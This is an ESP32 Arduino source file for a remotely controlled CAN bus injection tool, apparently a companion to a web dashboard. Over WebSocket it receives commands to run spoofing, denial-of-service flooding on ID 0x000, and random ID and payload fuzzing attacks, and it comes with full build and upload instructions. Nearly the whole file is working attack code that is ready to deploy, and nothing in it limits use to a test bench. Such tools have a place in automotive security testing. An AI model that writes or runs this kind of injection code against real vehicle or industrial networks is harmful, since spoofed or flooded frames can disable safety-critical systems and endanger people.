// Sample ESP32 WebSocket CAN Injection Engine
// This is a reference implementation for integrating ESP32 with the dashboard

#include <WiFi.h>
#include <WebSocketsClient.h>
#include <ArduinoJson.h>
#include <driver/can.h>
#include <time.h>

// ==========================================
// CONFIGURATION
// ==========================================

// WiFi Credentials
const char* ssid = "YOUR_SSID";
const char* password = "YOUR_PASSWORD";

// Server Configuration
const char* serverIP = "192.168.1.100";  // Change to your server IP
const uint16_t serverPort = 3000;

// CAN Configuration
const int canTxPin = 5;
const int canRxPin = 4;

// ==========================================
// GLOBAL VARIABLES
// ==========================================

WebSocketsClient webSocket;
unsigned long lastHeartbeat = 0;
unsigned long injectionCounter = 0;
bool attackRunning = false;
String currentAttackType = "";

struct AttackParams {
  String id;
  String payload;
  uint16_t frequency;
  uint8_t intensity;
  String fuzzMode;
  String minId;
  String maxId;
  String payloadMode;
} currentParams;

// ==========================================
// SETUP
// ==========================================

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n\n");
  Serial.println("========================================");
  Serial.println("ESP32 CAN Injection Engine");
  Serial.println("========================================");

  // Initialize CAN
  initCAN();

  // Connect to WiFi
  connectToWiFi();

  // Connect to WebSocket
  connectToServer();
}

// ==========================================
// MAIN LOOP
// ==========================================

void loop() {
  webSocket.loop();

  // Send heartbeat every 2 seconds
  if (millis() - lastHeartbeat >= 2000) {
    sendHeartbeat();
    lastHeartbeat = millis();
  }

  // Execute attack if running
  if (attackRunning) {
    executeAttack();
  }

  delay(10);
}

// ==========================================
// CAN INITIALIZATION
// ==========================================

void initCAN() {
  Serial.println("[CAN] Initializing CAN bus...");

  can_general_config_t g_config = CAN_GENERAL_CONFIG_DEFAULT(canTxPin, canRxPin, CAN_MODE_NORMAL);
  can_timing_config_t t_config = CAN_TIMING_CONFIG_500KBPS();
  can_filter_config_t f_config = CAN_FILTER_CONFIG_ACCEPT_ALL();

  if (can_driver_install(&g_config, &t_config, &f_config) == ESP_OK) {
    Serial.println("[CAN] Driver installed successfully");
  } else {
    Serial.println("[CAN] ERROR: Failed to install driver");
    return;
  }

  if (can_start() == ESP_OK) {
    Serial.println("[CAN] Driver started successfully");
  } else {
    Serial.println("[CAN] ERROR: Failed to start driver");
  }
}

// ==========================================
// WIFI CONNECTION
// ==========================================

void connectToWiFi() {
  Serial.println("[WiFi] Connecting to WiFi: " + String(ssid));

  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 40) {
    delay(500);
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n[WiFi] Connected!");
    Serial.println("[WiFi] IP Address: " + WiFi.localIP().toString());
  } else {
    Serial.println("\n[WiFi] ERROR: Failed to connect");
  }
}

// ==========================================
// WEBSOCKET CONNECTION
// ==========================================

void connectToServer() {
  Serial.println("[WebSocket] Connecting to " + String(serverIP) + ":" + String(serverPort));

  webSocket.setReconnectInterval(3000);
  webSocket.setExtraHeaders("User-Agent: ESP32-CAN");

  webSocket.begin(serverIP, serverPort, "/");
  webSocket.onEvent(onWebSocketEvent);
}

// ==========================================
// WEBSOCKET EVENT HANDLER
// ==========================================

void onWebSocketEvent(WStype_t type, uint8_t *payload, size_t length) {
  switch (type) {
    case WStype_DISCONNECTED:
      Serial.println("[WebSocket] Disconnected");
      attackRunning = false;
      break;

    case WStype_CONNECTED:
      Serial.println("[WebSocket] Connected to server");
      break;

    case WStype_TEXT:
      handleWebSocketMessage((char *)payload, length);
      break;

    case WStype_BIN:
      Serial.println("[WebSocket] Received binary data (not supported)");
      break;

    case WStype_ERROR:
      Serial.println("[WebSocket] Error occurred");
      break;

    case WStype_FRAGMENT_TEXT_START:
    case WStype_FRAGMENT_BIN_START:
    case WStype_FRAGMENT:
    case WStype_FRAGMENT_FIN:
      Serial.println("[WebSocket] Fragment received");
      break;
  }
}

// ==========================================
// MESSAGE HANDLING
// ==========================================

void handleWebSocketMessage(char *payload, size_t length) {
  DynamicJsonDocument doc(2048);

  DeserializationError error = deserializeJson(doc, payload);

  if (error) {
    Serial.println("[JSON] Parse error: " + String(error.c_str()));
    return;
  }

  const char *type = doc["type"];

  if (strcmp(type, "start_attack") == 0) {
    handleStartAttack(doc);
  } else if (strcmp(type, "stop_attack") == 0) {
    handleStopAttack();
  } else if (strcmp(type, "pause_attack") == 0) {
    handlePauseAttack();
  } else if (strcmp(type, "resume_attack") == 0) {
    handleResumeAttack();
  } else if (strcmp(type, "kill") == 0) {
    handleEmergencyKill();
  } else if (strcmp(type, "update_frequency") == 0) {
    currentParams.frequency = doc["frequency"];
    sendLogEvent("frequency_updated", 0, "", currentParams.frequency);
  } else if (strcmp(type, "update_id") == 0) {
    currentParams.id = doc["id"].as<String>();
    sendLogEvent("id_updated", 0, "", currentParams.frequency);
  } else if (strcmp(type, "update_payload") == 0) {
    currentParams.payload = doc["payload"].as<String>();
    sendLogEvent("payload_updated", 0, "", currentParams.frequency);
  } else if (strcmp(type, "update_intensity") == 0) {
    currentParams.intensity = doc["intensity"];
    sendLogEvent("intensity_updated", 0, "", currentParams.frequency);
  } else {
    Serial.println("[WebSocket] Unknown message type: " + String(type));
  }
}

void handleStartAttack(DynamicJsonDocument &doc) {
  const char *attackType = doc["attack_type"];
  currentAttackType = String(attackType);

  // Parse parameters
  currentParams.frequency = doc["parameters"]["frequency"];
  currentParams.intensity = doc["parameters"]["intensity"];
  currentParams.id = doc["parameters"]["id"].as<String>();
  currentParams.payload = doc["parameters"]["payload"].as<String>();

  // Optional fuzzing parameters
  if (doc["parameters"].containsKey("fuzz_mode")) {
    currentParams.fuzzMode = doc["parameters"]["fuzz_mode"].as<String>();
    currentParams.minId = doc["parameters"]["min_id"].as<String>();
    currentParams.maxId = doc["parameters"]["max_id"].as<String>();
    currentParams.payloadMode = doc["parameters"]["payload_mode"].as<String>();
  }

  attackRunning = true;
  injectionCounter = 0;

  Serial.println("[Attack] Started: " + currentAttackType);
  Serial.println("[Attack] Frequency: " + String(currentParams.frequency) + " Hz");
  Serial.println("[Attack] Intensity: " + String(currentParams.intensity));

  sendLogEvent("attack_started", 0, "", currentParams.frequency);
}

void handleStopAttack() {
  attackRunning = false;
  Serial.println("[Attack] Stopped");
  sendLogEvent("attack_stopped", 0, "", 0);
}

void handlePauseAttack() {
  attackRunning = false;
  Serial.println("[Attack] Paused");
  sendLogEvent("attack_paused", 0, "", currentParams.frequency);
}

void handleResumeAttack() {
  attackRunning = true;
  Serial.println("[Attack] Resumed");
  sendLogEvent("attack_resumed", 0, "", currentParams.frequency);
}

void handleEmergencyKill() {
  attackRunning = false;
  injectionCounter = 0;
  Serial.println("[Attack] EMERGENCY KILL received!");
  sendLogEvent("emergency_kill", 0, "", 0);
}

// ==========================================
// ATTACK EXECUTION
// ==========================================

void executeAttack() {
  if (currentAttackType == "spoofing") {
    executeSpoofing();
  } else if (currentAttackType == "dos") {
    executeDOS();
  } else if (currentAttackType == "fuzzing") {
    executeFuzzing();
  }
}

void executeSpoofing() {
  // Calculate delay between injections (microseconds)
  unsigned long delayUs = 1000000 / currentParams.frequency;

  // Parse CAN ID from hex string
  uint32_t canId = strtol(currentParams.id.c_str(), NULL, 16);

  // Send CAN frame
  can_message_t message;
  message.identifier = canId;
  message.flags = CAN_MSG_FLAG_EXTD; // Extended ID
  message.data_length_code = 8;

  // Parse payload hex string to bytes
  for (int i = 0; i < 8; i++) {
    String byteStr = currentParams.payload.substring(i * 2, i * 2 + 2);
    message.data[i] = strtol(byteStr.c_str(), NULL, 16);
  }

  // Send with intensity-based delays
  uint16_t injectionDelay = delayUs / currentParams.intensity;

  if (can_transmit(&message, pdMS_TO_TICKS(10)) == ESP_OK) {
    injectionCounter++;

    if (injectionCounter % 100 == 0) {
      Serial.println("[Spoofing] Sent " + String(injectionCounter) + " frames");
      sendLogEvent("spoofing", canId, currentParams.payload, currentParams.frequency);
    }
  }

  delayMicroseconds(injectionDelay);
}

void executeDOS() {
  // DoS attacks use fixed ID 0x000 and high frequency
  can_message_t message;
  message.identifier = 0x000;
  message.flags = CAN_MSG_FLAG_EXTD;
  message.data_length_code = 8;

  // Fill with zeros or custom payload
  if (currentParams.payload.length() > 0) {
    for (int i = 0; i < 8; i++) {
      String byteStr = currentParams.payload.substring(i * 2, i * 2 + 2);
      message.data[i] = strtol(byteStr.c_str(), NULL, 16);
    }
  } else {
    memset(message.data, 0, 8);
  }

  unsigned long delayUs = 1000000 / currentParams.frequency;
  uint16_t injectionDelay = delayUs / currentParams.intensity;

  if (can_transmit(&message, pdMS_TO_TICKS(10)) == ESP_OK) {
    injectionCounter++;

    if (injectionCounter % 500 == 0) {
      Serial.println("[DoS] Sent " + String(injectionCounter) + " frames");
      sendLogEvent("dos", 0x000, "", currentParams.frequency);
    }
  }

  delayMicroseconds(injectionDelay);
}

void executeFuzzing() {
  can_message_t message;
  message.data_length_code = 8;
  message.flags = CAN_MSG_FLAG_EXTD;

  uint32_t minId = strtol(currentParams.minId.c_str(), NULL, 16);
  uint32_t maxId = strtol(currentParams.maxId.c_str(), NULL, 16);

  // Generate random ID if needed
  if (currentParams.fuzzMode == "random_id" || currentParams.fuzzMode == "id_payload") {
    message.identifier = random(minId, maxId + 1);
  } else {
    message.identifier = minId;
  }

  // Generate random payload if needed
  if (currentParams.fuzzMode == "random_payload" || currentParams.fuzzMode == "id_payload") {
    for (int i = 0; i < 8; i++) {
      message.data[i] = random(0, 256);
    }
  } else {
    memset(message.data, 0, 8);
  }

  unsigned long delayUs = 1000000 / currentParams.frequency;
  uint16_t injectionDelay = delayUs / currentParams.intensity;

  if (can_transmit(&message, pdMS_TO_TICKS(10)) == ESP_OK) {
    injectionCounter++;

    if (injectionCounter % 100 == 0) {
      char payload[17];
      sprintf(payload, "%02X%02X%02X%02X%02X%02X%02X%02X", message.data[0], message.data[1],
              message.data[2], message.data[3], message.data[4], message.data[5], message.data[6],
              message.data[7]);
      sendLogEvent("fuzzing", message.identifier, String(payload), currentParams.frequency);
    }
  }

  delayMicroseconds(injectionDelay);
}

// ==========================================
// WEBSOCKET TRANSMISSION
// ==========================================

void sendHeartbeat() {
  DynamicJsonDocument doc(256);
  doc["type"] = "heartbeat";
  doc["status"] = "ready";

  String json;
  serializeJson(doc, json);

  webSocket.sendTXT(json);
}

void sendLogEvent(const char *event, uint32_t canId, String payload, uint16_t frequency) {
  DynamicJsonDocument doc(512);
  doc["type"] = "log_event";
  doc["timestamp"] = getCurrentTime();
  doc["attack_type"] = currentAttackType;
  doc["id"] = "0x" + String(canId, HEX);
  doc["payload"] = payload;
  doc["frequency"] = frequency;
  doc["status"] = event;

  String json;
  serializeJson(doc, json);

  webSocket.sendTXT(json);

  Serial.println("[Log] " + json);
}

// ==========================================
// UTILITIES
// ==========================================

String getCurrentTime() {
  time_t now = time(nullptr);
  struct tm *timeinfo = localtime(&now);
  char buffer[25];
  strftime(buffer, sizeof(buffer), "%Y-%m-%dT%H:%M:%SZ", timeinfo);
  return String(buffer);
}

// ==========================================
// NOTES FOR COMPILATION
// ==========================================

/*
Required Libraries (install via Arduino IDE):
- WebSockets by Markus Sattler (v2.4.0+)
- ArduinoJson by Benoit Blanchon (v6.19.0+)

ESP32 Board: ESP32 Dev Module or equivalent

Pin Configuration:
- CAN TX: GPIO 5 (adjust based on your hardware)
- CAN RX: GPIO 4 (adjust based on your hardware)

Compilation Instructions:
1. Select board: Tools > Board > ESP32 Arduino > ESP32 Dev Module
2. Select Port: Tools > Port > (your COM port)
3. Adjust WiFi SSID, password, and server IP
4. Compile and upload

Troubleshooting:
- If CAN fails to initialize, check GPIO pins
- If WebSocket fails, verify server IP and port
- Check Serial Monitor (115200 baud) for debug output
*/
